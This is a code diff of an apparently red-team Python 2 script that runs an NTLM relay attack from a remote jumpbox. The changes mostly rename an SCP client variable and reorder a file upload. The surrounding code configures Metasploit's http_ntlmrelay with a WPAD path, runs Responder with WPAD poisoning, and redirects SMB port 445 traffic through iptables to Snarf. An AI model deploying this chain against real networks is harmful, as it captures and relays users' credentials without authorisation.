@@ -267,7 +267,7 @@ def ssh_client(server, port, user, pw):
     print '    \_ Done'
     return client
 
-def remote_start_msf_http_relay(ssh, scp, j_local_ip, home_dir):
+def remote_start_msf_http_relay(ssh, scpc, j_local_ip, home_dir):
     options = 'use auxiliary/server/http_ntlmrelay\n'
     options += 'set URIPATH /wpad.dat\n'
     options += 'set SRVHOST {}\n'.format(j_local_ip)
@@ -282,7 +282,7 @@ def remote_start_msf_http_relay(ssh, scp, j_local_ip, home_dir):
     # SCP the http_relay script up to jumpbox
     local_path = os.getcwd()+'/http_relay.rc'
     remote_path = '{}http_relay.rc'.format(home_dir)
-    scp.put(local_path, remote_path)
+    scpc.put(local_path, remote_path)
 
     # Start MSF on jumpbox
     # MUST 'msfconsole -L' or else screen exits as soon as it reaches end of script
@@ -297,16 +297,16 @@ def get_errors(stderr):
             for l in err:
                 print '          '+l
 
-def remote_start_responder(ssh, scp, iface, home_dir):
+def remote_start_responder(ssh, scpc, iface, home_dir):
     github_url = 'https://github.com/SpiderLabs/Responder'
     remote_get_git_project(ssh, github_url, home_dir)
 
-    remote_adjust_responder_conf(scp, home_dir)
+    remote_adjust_responder_conf(scpc, home_dir)
 
     cmd = 'screen -S relay-responder -dm python {}Responder/Responder.py -I {} -r -d --wpad'.format(home_dir, iface)
     stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
 
-def remote_adjust_responder_conf(scp, home_dir):
+def remote_adjust_responder_conf(scpc, home_dir):
     relay_conf = []
     r = urllib2.urlopen('https://raw.githubusercontent.com/SpiderLabs/Responder/master/Responder.conf')
     conf_file = r.read()
@@ -329,9 +329,9 @@ def remote_adjust_responder_conf(scp, home_dir):
 
     local_path = os.getcwd()+'/relay-Responder.conf'
     remote_path = '{}Responder/Responder.conf'.format(home_dir)
-    scp.put(local_path, remote_path)
+    scpc.put(local_path, remote_path)
 
-def remote_cleanup(ssh, scp, forw_server, home_dir):
+def remote_cleanup(ssh, scpc, forw_server, home_dir):
     print '[*] Cleaning up...'
     forw_server.stop()
     ssh.exec_command("ps aux | grep -i 'SCREEN -S snarf -dm nodejs /opt/snarf/snarf.js -f \
@@ -347,7 +347,7 @@ def remote_cleanup(ssh, scp, forw_server, home_dir):
 
     local_path = os.getcwd()+'/orig-Responder.conf'
     remote_path = '{}Responder/Responder.conf'.format(home_dir)
-    scp.put(local_path, remote_path)
+    scpc.put(local_path, remote_path)
     print '      \_ Done'
 
 def remote_confirm(ssh):
@@ -390,24 +390,18 @@ def remote_main(args):
     user = raw_input('[+] Username for the remote jumpbox: ')
     pw = getpass.getpass()
     ssh = ssh_client(jumpbox_ip, port, user, pw)
-    scp = SCPClient(ssh.get_transport())
+    scpc = SCPClient(ssh.get_transport())
     j_local_ip = jumpbox_ip_interface(ssh, iface)
     if j_local_ip == None:
         sys.exit('[-] Could not find local IP address for {}. Check function jumpbox_ip_interface()'.format(iface))
-
-    # Get SMB hosts
-    hostfile = get_SMB_hosts(args)
-    local_path = os.getcwd()+'/{}'.format(hostfile)
-    remote_path = '{}snarf/{}'.format(home_dir, hostfile)
-    try:
-        scp.put(local_path, remote_path)
-    except SCPException:
-        sys.exit('[-] Failed to copy smb_hosts.txt to the remote jumpbox')
 
     # Print vars
     print '[*] Jumpbox IP: {}'.format(jumpbox_ip)
     print '[*] Jumpbox local IP: {}'.format(j_local_ip)
     print '[*] Forwarding jumpbox port {} to local port {}'.format(forw_port, forw_port)
+
+    # Get SMB hosts
+    hostfile = get_SMB_hosts(args)
 
     # Get Snarf
     github_url = 'https://github.com/purpleteam/snarf'
@@ -424,15 +418,23 @@ def remote_main(args):
     cmd = 'iptables -t nat -A PREROUTING -p tcp --dport 445 -j SNARF'
     stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
 
+    # Upload SMB hosts
+    local_path = os.getcwd()+'/{}'.format(hostfile)
+    remote_path = '{}snarf/{}'.format(home_dir, hostfile)
+    try:
+        scpc.put(local_path, remote_path)
+    except SCPException:
+        sys.exit('[-] Failed to copy smb_hosts.txt to the remote jumpbox')
+
     # Start forwarding port 4001
     forw_server = ssh_L(jumpbox_ip, forw_port, user, pw)
     forw_server.start()
 
     # Start MSF http_relay
-    remote_start_msf_http_relay(ssh, scp, j_local_ip, home_dir)
+    remote_start_msf_http_relay(ssh, scpc, j_local_ip, home_dir)
 
     # Start Responder
-    remote_start_responder(ssh, scp, iface, home_dir)
+    remote_start_responder(ssh, scpc, iface, home_dir)
 
     # Confirm everything's running
     remote_confirm(ssh)
@@ -448,7 +450,7 @@ def remote_main(args):
         while 1:
             time.sleep(10)
     except KeyboardInterrupt:
-        remote_cleanup(ssh, scp, forw_server, home_dir)
+        remote_cleanup(ssh, scpc, forw_server, home_dir)
         sys.exit()
 
 def get_SMB_hosts(args):
